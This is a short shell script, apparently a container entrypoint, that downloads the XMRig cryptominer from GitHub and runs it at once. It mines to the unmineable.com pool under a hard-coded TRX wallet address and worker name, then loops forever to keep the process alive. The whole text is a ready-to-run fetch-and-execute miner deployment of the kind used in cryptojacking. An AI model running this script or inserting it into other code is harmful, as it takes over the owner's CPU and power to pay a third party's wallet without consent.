/bin/sh -c
sudo apt update
apt-get install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -xf xmrig-6.21.0-linux-x64.tar.gz
cd xmrig-6.21.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TMknJ7AFuSn2FiSTwyBAzJjqYyfdkVqmDF.mubin-pc#8vlt-7pqv -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
